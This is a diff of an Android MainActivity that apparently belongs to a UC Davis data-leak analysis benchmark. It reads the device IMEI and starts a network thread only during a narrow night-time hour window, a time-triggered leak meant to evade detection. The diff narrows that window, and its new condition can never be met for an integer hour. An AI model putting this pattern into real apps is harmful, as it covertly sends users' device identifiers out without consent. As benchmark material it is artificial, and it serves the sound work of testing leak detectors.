@@ -1,4 +1,4 @@
-package edu.ucdavis.time1;
+package edu.ucdavis.time2;
 
 import android.content.Context;
 import android.support.v7.app.AppCompatActivity;
@@ -12,13 +12,13 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.util.Calendar;
+import java.util.Date;
 
 /**
  * Class: MainActivity
- * Description: Sensitive data is read in onCreate() and send out when current hour is in 2AM~5AM
+ * Description: Sensitive data is read in onCreate() and send out when current hour is in 3AM~4AM
  * Authors：Hao Fu(haofu@ucdavis.edu)
- * Date: 6/30/2016 6:05 PM
+ * Date: 6/30/2016 6:09 PM
  */
 public class MainActivity extends AppCompatActivity {
 
@@ -30,11 +30,12 @@ public class MainActivity extends AppCompatActivity {
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         String imei = telephonyManager.getDeviceId(); //source
 
-        Calendar calendar = Calendar.getInstance();
-        int hours = calendar.get(Calendar.HOUR_OF_DAY);
+        Date date = new Date();
+        int hours = date.getHours();
 
-        if (hours > 2 && hours < 5) {
-            Log.d(getClass().getSimpleName(), "Hours: " + hours);
+        Log.d(getClass().getSimpleName(), "Hours: " + hours);
+
+        if (hours > 3 && hours < 4) {
             Thread connectionThread = new Thread(new ConnectionThread(imei));
             connectionThread.start();
         }
